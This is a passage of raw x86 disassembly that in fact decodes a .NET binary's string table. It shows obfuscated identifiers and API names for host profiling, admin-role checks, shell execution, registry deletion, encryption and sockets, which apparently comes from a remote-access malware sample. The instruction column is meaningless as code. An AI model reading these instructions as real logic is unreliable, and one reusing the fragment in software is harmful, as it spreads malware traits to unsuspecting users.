  408509:	65 00 63 48          	add    %ah,%gs:0x48(%ebx)
  40850d:	67 72 4d             	addr16 jb 0x40855d
  408510:	59                   	pop    %ecx
  408511:	59                   	pop    %ecx
  408512:	70 71                	jo     0x408585
  408514:	6f                   	outsl  %ds:(%esi),(%dx)
  408515:	54                   	push   %esp
  408516:	4c                   	dec    %esp
  408517:	65 00 43 77          	add    %al,%gs:0x77(%ebx)
  40851b:	5a                   	pop    %edx
  40851c:	6f                   	outsl  %ds:(%esi),(%dx)
  40851d:	4a                   	dec    %edx
  40851e:	62 50 75             	bound  %edx,0x75(%eax)
  408521:	4a                   	dec    %edx
  408522:	4b                   	dec    %ebx
  408523:	4e                   	dec    %esi
  408524:	65 4e                	gs dec %esi
  408526:	65 00 75 56          	add    %dh,%gs:0x56(%ebp)
  40852a:	4f                   	dec    %edi
  40852b:	4b                   	dec    %ebx
  40852c:	51                   	push   %ecx
  40852d:	48                   	dec    %eax
  40852e:	47                   	inc    %edi
  40852f:	55                   	push   %ebp
  408530:	4e                   	dec    %esi
  408531:	66 61                	popaw
  408533:	50                   	push   %eax
  408534:	71 55                	jno    0x40858b
  408536:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40853a:	70 6c                	jo     0x4085a8
  40853c:	61                   	popa
  40853d:	63 65 00             	arpl   %esp,0x0(%ebp)
  408540:	43                   	inc    %ebx
  408541:	72 65                	jb     0x4085a8
  408543:	61                   	popa
  408544:	74 65                	je     0x4085ab
  408546:	49                   	dec    %ecx
  408547:	6e                   	outsb  %ds:(%esi),(%dx)
  408548:	73 74                	jae    0x4085be
  40854a:	61                   	popa
  40854b:	6e                   	outsb  %ds:(%esi),(%dx)
  40854c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40854f:	4e                   	dec    %esi
  408550:	4e                   	dec    %esi
  408551:	4b                   	dec    %ebx
  408552:	45                   	inc    %ebp
  408553:	5a                   	pop    %edx
  408554:	42                   	inc    %edx
  408555:	51                   	push   %ecx
  408556:	54                   	push   %esp
  408557:	6f                   	outsl  %ds:(%esi),(%dx)
  408558:	78 47                	js     0x4085a1
  40855a:	6e                   	outsb  %ds:(%esi),(%dx)
  40855b:	65 48                	gs dec %eax
  40855d:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408562:	74 5f                	je     0x4085c3
  408564:	4d                   	dec    %ebp
  408565:	6f                   	outsl  %ds:(%esi),(%dx)
  408566:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40856b:	6c                   	insb   (%dx),%es:(%edi)
  40856c:	65 4d                	gs dec %ebp
  40856e:	6f                   	outsl  %ds:(%esi),(%dx)
  40856f:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408574:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  40857b:	64 65 
  40857d:	00 45 6e             	add    %al,0x6e(%ebp)
  408580:	74 65                	je     0x4085e7
  408582:	72 44                	jb     0x4085c8
  408584:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408588:	4d                   	dec    %ebp
  408589:	6f                   	outsl  %ds:(%esi),(%dx)
  40858a:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40858f:	79 70                	jns    0x408601
  408591:	74 6f                	je     0x408602
  408593:	53                   	push   %ebx
  408594:	74 72                	je     0x408608
  408596:	65 61                	gs popa
  408598:	6d                   	insl   (%dx),%es:(%edi)
  408599:	4d                   	dec    %ebp
  40859a:	6f                   	outsl  %ds:(%esi),(%dx)
  40859b:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4085a0:	6d                   	insl   (%dx),%es:(%edi)
  4085a1:	70 72                	jo     0x408615
  4085a3:	65 73 73             	gs jae 0x408619
  4085a6:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4085ad:	00 43 69             	add    %al,0x69(%ebx)
  4085b0:	70 68                	jo     0x40861a
  4085b2:	65 72 4d             	gs jb  0x408602
  4085b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b6:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4085bb:	6c                   	insb   (%dx),%es:(%edi)
  4085bc:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4085c1:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4085c7:	65 74 65             	gs je  0x40862f
  4085ca:	53                   	push   %ebx
  4085cb:	75 62                	jne    0x40862f
  4085cd:	4b                   	dec    %ebx
  4085ce:	65 79 54             	gs jns 0x408625
  4085d1:	72 65                	jb     0x408638
  4085d3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085d7:	74 5f                	je     0x408638
  4085d9:	4d                   	dec    %ebp
  4085da:	65 73 73             	gs jae 0x408650
  4085dd:	61                   	popa
  4085de:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  4085e3:	76 6f                	jbe    0x408654
  4085e5:	6b 65 00 59          	imul   $0x59,0x0(%ebp),%esp
  4085e9:	59                   	pop    %ecx
  4085ea:	74 4a                	je     0x408636
  4085ec:	43                   	inc    %ebx
  4085ed:	59                   	pop    %ecx
  4085ee:	56                   	push   %esi
  4085ef:	42                   	inc    %edx
  4085f0:	4d                   	dec    %ebp
  4085f1:	6c                   	insb   (%dx),%es:(%edi)
  4085f2:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  4085f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f7:	75 6d                	jne    0x408666
  4085f9:	65 72 61             	gs jb  0x40865d
  4085fc:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408600:	49                   	dec    %ecx
  408601:	44                   	inc    %esp
  408602:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408609:	6c                   	insb   (%dx),%es:(%edi)
  40860a:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  40860f:	6f                   	outsl  %ds:(%esi),(%dx)
  408610:	75 62                	jne    0x408674
  408612:	6c                   	insb   (%dx),%es:(%edi)
  408613:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408617:	74 5f                	je     0x408678
  408619:	48                   	dec    %eax
  40861a:	61                   	popa
  40861b:	6e                   	outsb  %ds:(%esi),(%dx)
  40861c:	64 6c                	fs insb (%dx),%es:(%edi)
  40861e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408622:	6e                   	outsb  %ds:(%esi),(%dx)
  408623:	74 69                	je     0x40868e
  408625:	6d                   	insl   (%dx),%es:(%edi)
  408626:	65 46                	gs inc %esi
  408628:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  40862f:	64 6c                	fs insb (%dx),%es:(%edi)
  408631:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408635:	74 4d                	je     0x408684
  408637:	6f                   	outsl  %ds:(%esi),(%dx)
  408638:	64 75 6c             	fs jne 0x4086a7
  40863b:	65 48                	gs dec %eax
  40863d:	61                   	popa
  40863e:	6e                   	outsb  %ds:(%esi),(%dx)
  40863f:	64 6c                	fs insb (%dx),%es:(%edi)
  408641:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408645:	6e                   	outsb  %ds:(%esi),(%dx)
  408646:	74 69                	je     0x4086b1
  408648:	6d                   	insl   (%dx),%es:(%edi)
  408649:	65 54                	gs push %esp
  40864b:	79 70                	jns    0x4086bd
  40864d:	65 48                	gs dec %eax
  40864f:	61                   	popa
  408650:	6e                   	outsb  %ds:(%esi),(%dx)
  408651:	64 6c                	fs insb (%dx),%es:(%edi)
  408653:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408657:	74 54                	je     0x4086ad
  408659:	79 70                	jns    0x4086cb
  40865b:	65 46                	gs inc %esi
  40865d:	72 6f                	jb     0x4086ce
  40865f:	6d                   	insl   (%dx),%es:(%edi)
  408660:	48                   	dec    %eax
  408661:	61                   	popa
  408662:	6e                   	outsb  %ds:(%esi),(%dx)
  408663:	64 6c                	fs insb (%dx),%es:(%edi)
  408665:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408669:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408670:	65 
  408671:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408675:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40867c:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408683:	6e 
  408684:	52                   	push   %edx
  408685:	6f                   	outsl  %ds:(%esi),(%dx)
  408686:	6c                   	insb   (%dx),%es:(%edi)
  408687:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40868b:	6e                   	outsb  %ds:(%esi),(%dx)
  40868c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40868e:	77 73                	ja     0x408703
  408690:	42                   	inc    %edx
  408691:	75 69                	jne    0x4086fc
  408693:	6c                   	insb   (%dx),%es:(%edi)
  408694:	74 49                	je     0x4086df
  408696:	6e                   	outsb  %ds:(%esi),(%dx)
  408697:	52                   	push   %edx
  408698:	6f                   	outsl  %ds:(%esi),(%dx)
  408699:	6c                   	insb   (%dx),%es:(%edi)
  40869a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40869e:	74 5f                	je     0x4086ff
  4086a0:	4d                   	dec    %ebp
  4086a1:	61                   	popa
  4086a2:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4086a9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4086ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ae:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b1:	73 4d                	jae    0x408700
  4086b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b4:	64 75 6c             	fs jne 0x408723
  4086b7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086bb:	74 5f                	je     0x40871c
  4086bd:	57                   	push   %edi
  4086be:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086c5:	79 6c                	jns    0x408733
  4086c7:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4086cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086cf:	73 57                	jae    0x408728
  4086d1:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086d8:	79 6c                	jns    0x408746
  4086da:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086de:	74 5f                	je     0x40873f
  4086e0:	4e                   	dec    %esi
  4086e1:	61                   	popa
  4086e2:	6d                   	insl   (%dx),%es:(%edi)
  4086e3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086e7:	74 5f                	je     0x408748
  4086e9:	46                   	inc    %esi
  4086ea:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086f1:	00 
  4086f2:	73 65                	jae    0x408759
  4086f4:	74 5f                	je     0x408755
  4086f6:	46                   	inc    %esi
  4086f7:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086fe:	00 
  4086ff:	47                   	inc    %edi
  408700:	65 74 54             	gs je  0x408757
  408703:	65 6d                	gs insl (%dx),%es:(%edi)
  408705:	70 46                	jo     0x40874d
  408707:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40870e:	00 
  40870f:	47                   	inc    %edi
  408710:	65 74 46             	gs je  0x408759
  408713:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40871a:	00 
  40871b:	67 65 74 5f          	addr16 gs je 0x40877e
  40871f:	4d                   	dec    %ebp
  408720:	61                   	popa
  408721:	63 68 69             	arpl   %ebp,0x69(%eax)
  408724:	6e                   	outsb  %ds:(%esi),(%dx)
  408725:	65 4e                	gs dec %esi
  408727:	61                   	popa
  408728:	6d                   	insl   (%dx),%es:(%edi)
  408729:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40872d:	74 5f                	je     0x40878e
  40872f:	4f                   	dec    %edi
  408730:	53                   	push   %ebx
  408731:	46                   	inc    %esi
  408732:	75 6c                	jne    0x4087a0
  408734:	6c                   	insb   (%dx),%es:(%edi)
  408735:	4e                   	dec    %esi
  408736:	61                   	popa
  408737:	6d                   	insl   (%dx),%es:(%edi)
  408738:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40873c:	74 5f                	je     0x40879d
  40873e:	46                   	inc    %esi
  40873f:	75 6c                	jne    0x4087ad
  408741:	6c                   	insb   (%dx),%es:(%edi)
  408742:	4e                   	dec    %esi
  408743:	61                   	popa
  408744:	6d                   	insl   (%dx),%es:(%edi)
  408745:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408749:	74 5f                	je     0x4087aa
  40874b:	55                   	push   %ebp
  40874c:	73 65                	jae    0x4087b3
  40874e:	72 4e                	jb     0x40879e
  408750:	61                   	popa
  408751:	6d                   	insl   (%dx),%es:(%edi)
  408752:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408756:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  40875a:	6f                   	outsl  %ds:(%esi),(%dx)
  40875b:	73 74                	jae    0x4087d1
  40875d:	4e                   	dec    %esi
  40875e:	61                   	popa
  40875f:	6d                   	insl   (%dx),%es:(%edi)
  408760:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408765:	65 54                	gs push %esp
  408767:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  40876e:	5f                   	pop    %edi
  40876f:	4c                   	dec    %esp
  408770:	61                   	popa
  408771:	73 74                	jae    0x4087e7
  408773:	57                   	push   %edi
  408774:	72 69                	jb     0x4087df
  408776:	74 65                	je     0x4087dd
  408778:	54                   	push   %esp
  408779:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408780:	6e                   	outsb  %ds:(%esi),(%dx)
  408781:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408788:	54                   	push   %esp
  408789:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408790:	74 65                	je     0x4087f7
  408792:	4c                   	dec    %esp
  408793:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  40879a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40879d:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4087a1:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4087a8:	6d                   	insl   (%dx),%es:(%edi)
  4087a9:	65 54                	gs push %esp
  4087ab:	79 70                	jns    0x40881d
  4087ad:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087b1:	74 5f                	je     0x408812
  4087b3:	56                   	push   %esi
  4087b4:	61                   	popa
  4087b5:	6c                   	insb   (%dx),%es:(%edi)
  4087b6:	75 65                	jne    0x40881d
  4087b8:	54                   	push   %esp
  4087b9:	79 70                	jns    0x40882b
  4087bb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c0:	74 6f                	je     0x408831
  4087c2:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4087c5:	54                   	push   %esp
  4087c6:	79 70                	jns    0x408838
  4087c8:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4087cc:	74 54                	je     0x408822
  4087ce:	79 70                	jns    0x408840
  4087d0:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4087d4:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4087d7:	74 54                	je     0x40882d
  4087d9:	79 70                	jns    0x40884b
  4087db:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4087df:	6c                   	insb   (%dx),%es:(%edi)
  4087e0:	65 53                	gs push %ebx
  4087e2:	68 61 72 65 00       	push   $0x657261
  4087e7:	53                   	push   %ebx
  4087e8:	79 73                	jns    0x40885d
  4087ea:	74 65                	je     0x408851
  4087ec:	6d                   	insl   (%dx),%es:(%edi)
  4087ed:	2e 43                	cs inc %ebx
  4087ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f0:	72 65                	jb     0x408857
  4087f2:	00 43 6c             	add    %al,0x6c(%ebx)
  4087f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f6:	73 65                	jae    0x40885d
  4087f8:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4087fc:	70 6f                	jo     0x40886d
  4087fe:	73 65                	jae    0x408865
  408800:	00 50 61             	add    %dl,0x61(%eax)
  408803:	72 73                	jb     0x408878
  408805:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408809:	72 52                	jb     0x40885d
  40880b:	65 76 65             	gs jbe 0x408873
  40880e:	72 73                	jb     0x408883
  408810:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  408814:	30 39                	xor    %bh,(%ecx)
  408816:	43                   	inc    %ebx
  408817:	65 72 74             	gs jb  0x40888e
  40881a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408821:	00 43 72             	add    %al,0x72(%ebx)
  408824:	65 61                	gs popa
  408826:	74 65                	je     0x40888d
  408828:	00 53 65             	add    %dl,0x65(%ebx)
  40882b:	74 54                	je     0x408881
  40882d:	68 72 65 61 64       	push   $0x64616572
  408832:	45                   	inc    %ebp
  408833:	78 65                	js     0x40889a
  408835:	63 75 74             	arpl   %esi,0x74(%ebp)
  408838:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40883f:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408844:	65 74 65             	gs je  0x4088ac
  408847:	00 43 61             	add    %al,0x61(%ebx)
  40884a:	6c                   	insb   (%dx),%es:(%edi)
  40884b:	6c                   	insb   (%dx),%es:(%edi)
  40884c:	53                   	push   %ebx
  40884d:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408854:	74 
  408855:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408859:	6d                   	insl   (%dx),%es:(%edi)
  40885a:	70 69                	jo     0x4088c5
  40885c:	6c                   	insb   (%dx),%es:(%edi)
  40885d:	65 72 47             	gs jb  0x4088a7
  408860:	65 6e                	outsb  %gs:(%esi),(%dx)
  408862:	65 72 61             	gs jb  0x4088c6
  408865:	74 65                	je     0x4088cc
  408867:	64 41                	fs inc %ecx
  408869:	74 74                	je     0x4088df
  40886b:	72 69                	jb     0x4088d6
  40886d:	62 75 74             	bound  %esi,0x74(%ebp)
  408870:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408875:	75 67                	jne    0x4088de
  408877:	67 61                	addr16 popa
  408879:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40887d:	74 74                	je     0x4088f3
  40887f:	72 69                	jb     0x4088ea
  408881:	62 75 74             	bound  %esi,0x74(%ebp)
  408884:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408888:	6d                   	insl   (%dx),%es:(%edi)
  408889:	56                   	push   %esi
  40888a:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408891:	74 74                	je     0x408907
  408893:	72 69                	jb     0x4088fe
  408895:	62 75 74             	bound  %esi,0x74(%ebp)
  408898:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40889c:	73 65                	jae    0x408903
  40889e:	6d                   	insl   (%dx),%es:(%edi)
  40889f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4088a3:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4088aa:	72 
  4088ab:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4088b2:	73 73                	jae    0x408927
  4088b4:	65 6d                	gs insl (%dx),%es:(%edi)
  4088b6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4088ba:	72 61                	jb     0x40891d
  4088bc:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4088bf:	61                   	popa
  4088c0:	72 6b                	jb     0x40892d
  4088c2:	41                   	inc    %ecx
  4088c3:	74 74                	je     0x408939
  4088c5:	72 69                	jb     0x408930
  4088c7:	62 75 74             	bound  %esi,0x74(%ebp)
  4088ca:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4088cf:	67 65 74 46          	addr16 gs je 0x408919
  4088d3:	72 61                	jb     0x408936
  4088d5:	6d                   	insl   (%dx),%es:(%edi)
  4088d6:	65 77 6f             	gs ja  0x408948
  4088d9:	72 6b                	jb     0x408946
  4088db:	41                   	inc    %ecx
  4088dc:	74 74                	je     0x408952
  4088de:	72 69                	jb     0x408949
  4088e0:	62 75 74             	bound  %esi,0x74(%ebp)
  4088e3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088e7:	73 65                	jae    0x40894e
  4088e9:	6d                   	insl   (%dx),%es:(%edi)
  4088ea:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4088ee:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4088f5:	69 
  4088f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f8:	41                   	inc    %ecx
  4088f9:	74 74                	je     0x40896f
  4088fb:	72 69                	jb     0x408966
  4088fd:	62 75 74             	bound  %esi,0x74(%ebp)
  408900:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408904:	73 65                	jae    0x40896b
  408906:	6d                   	insl   (%dx),%es:(%edi)
  408907:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40890b:	6f                   	outsl  %ds:(%esi),(%dx)
  40890c:	6e                   	outsb  %ds:(%esi),(%dx)
  40890d:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408913:	74 69                	je     0x40897e
  408915:	6f                   	outsl  %ds:(%esi),(%dx)
  408916:	6e                   	outsb  %ds:(%esi),(%dx)
  408917:	41                   	inc    %ecx
  408918:	74 74                	je     0x40898e
  40891a:	72 69                	jb     0x408985
  40891c:	62 75 74             	bound  %esi,0x74(%ebp)
  40891f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408923:	73 65                	jae    0x40898a
  408925:	6d                   	insl   (%dx),%es:(%edi)
  408926:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40892a:	65 73 63             	gs jae 0x408990
  40892d:	72 69                	jb     0x408998
  40892f:	70 74                	jo     0x4089a5
  408931:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408938:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40893f:	65 66 61             	gs popaw
  408942:	75 6c                	jne    0x4089b0
  408944:	74 4d                	je     0x408993
  408946:	65 6d                	gs insl (%dx),%es:(%edi)
  408948:	62 65 72             	bound  %esp,0x72(%ebp)
  40894b:	41                   	inc    %ecx
  40894c:	74 74                	je     0x4089c2
  40894e:	72 69                	jb     0x4089b9
  408950:	62 75 74             	bound  %esi,0x74(%ebp)
  408953:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408957:	6d                   	insl   (%dx),%es:(%edi)
  408958:	70 69                	jo     0x4089c3
  40895a:	6c                   	insb   (%dx),%es:(%edi)
  40895b:	61                   	popa
  40895c:	74 69                	je     0x4089c7
  40895e:	6f                   	outsl  %ds:(%esi),(%dx)
  40895f:	6e                   	outsb  %ds:(%esi),(%dx)
  408960:	52                   	push   %edx
  408961:	65 6c                	gs insb (%dx),%es:(%edi)
  408963:	61                   	popa
  408964:	78 61                	js     0x4089c7
  408966:	74 69                	je     0x4089d1
  408968:	6f                   	outsl  %ds:(%esi),(%dx)
  408969:	6e                   	outsb  %ds:(%esi),(%dx)
  40896a:	73 41                	jae    0x4089ad
  40896c:	74 74                	je     0x4089e2
  40896e:	72 69                	jb     0x4089d9
  408970:	62 75 74             	bound  %esi,0x74(%ebp)
  408973:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408977:	73 65                	jae    0x4089de
  408979:	6d                   	insl   (%dx),%es:(%edi)
  40897a:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40897e:	72 6f                	jb     0x4089ef
  408980:	64 75 63             	fs jne 0x4089e6
  408983:	74 41                	je     0x4089c6
  408985:	74 74                	je     0x4089fb
  408987:	72 69                	jb     0x4089f2
  408989:	62 75 74             	bound  %esi,0x74(%ebp)
  40898c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408990:	73 65                	jae    0x4089f7
  408992:	6d                   	insl   (%dx),%es:(%edi)
  408993:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408997:	6f                   	outsl  %ds:(%esi),(%dx)
  408998:	70 79                	jo     0x408a13
  40899a:	72 69                	jb     0x408a05
  40899c:	67 68 74 41 74 74    	addr16 push $0x74744174
  4089a2:	72 69                	jb     0x408a0d
  4089a4:	62 75 74             	bound  %esi,0x74(%ebp)
  4089a7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089ab:	73 65                	jae    0x408a12
  4089ad:	6d                   	insl   (%dx),%es:(%edi)
  4089ae:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4089b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b3:	6d                   	insl   (%dx),%es:(%edi)
  4089b4:	70 61                	jo     0x408a17
  4089b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b7:	79 41                	jns    0x4089fa
  4089b9:	74 74                	je     0x408a2f
  4089bb:	72 69                	jb     0x408a26
  4089bd:	62 75 74             	bound  %esi,0x74(%ebp)
  4089c0:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4089c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c5:	74 69                	je     0x408a30
  4089c7:	6d                   	insl   (%dx),%es:(%edi)
  4089c8:	65 43                	gs inc %ebx
  4089ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cb:	6d                   	insl   (%dx),%es:(%edi)
  4089cc:	70 61                	jo     0x408a2f
  4089ce:	74 69                	je     0x408a39
  4089d0:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4089d3:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4089da:	69 
  4089db:	62 75 74             	bound  %esi,0x74(%ebp)
  4089de:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4089e2:	74 5f                	je     0x408a43
  4089e4:	55                   	push   %ebp
  4089e5:	73 65                	jae    0x408a4c
  4089e7:	53                   	push   %ebx
  4089e8:	68 65 6c 6c 45       	push   $0x456c6c65
  4089ed:	78 65                	js     0x408a54
  4089ef:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089f2:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4089f6:	61                   	popa
  4089f7:	64 42                	fs inc %edx
  4089f9:	79 74                	jns    0x408a6f
  4089fb:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4089ff:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408a06:	00 
  408a07:	44                   	inc    %esp
  408a08:	65 6c                	gs insb (%dx),%es:(%edi)
  408a0a:	65 74 65             	gs je  0x408a72
  408a0d:	56                   	push   %esi
  408a0e:	61                   	popa
  408a0f:	6c                   	insb   (%dx),%es:(%edi)
  408a10:	75 65                	jne    0x408a77
  408a12:	00 47 65             	add    %al,0x65(%edi)
  408a15:	74 56                	je     0x408a6d
  408a17:	61                   	popa
  408a18:	6c                   	insb   (%dx),%es:(%edi)
  408a19:	75 65                	jne    0x408a80
  408a1b:	00 53 65             	add    %dl,0x65(%ebx)
  408a1e:	74 56                	je     0x408a76
  408a20:	61                   	popa
  408a21:	6c                   	insb   (%dx),%es:(%edi)
  408a22:	75 65                	jne    0x408a89
  408a24:	00 61 47             	add    %ah,0x47(%ecx)
  408a27:	53                   	push   %ebx
  408a28:	54                   	push   %esp
  408a29:	66 6b 41 48 76       	imul   $0x76,0x48(%ecx),%ax
  408a2e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408a32:	74 5f                	je     0x408a93
  408a34:	4b                   	dec    %ebx
  408a35:	65 65 70 41          	gs gs jo 0x408a7a
  408a39:	6c                   	insb   (%dx),%es:(%edi)
  408a3a:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a41:	5f                   	pop    %edi
  408a42:	4b                   	dec    %ebx
  408a43:	65 65 70 41          	gs gs jo 0x408a88
  408a47:	6c                   	insb   (%dx),%es:(%edi)
  408a48:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a50:	76 65                	jbe    0x408ab7
  408a52:	00 73 65             	add    %dh,0x65(%ebx)
  408a55:	74 5f                	je     0x408ab6
  408a57:	42                   	inc    %edx
  408a58:	6c                   	insb   (%dx),%es:(%edi)
  408a59:	6f                   	outsl  %ds:(%esi),(%dx)
  408a5a:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a5d:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a64:	5f                   	pop    %edi
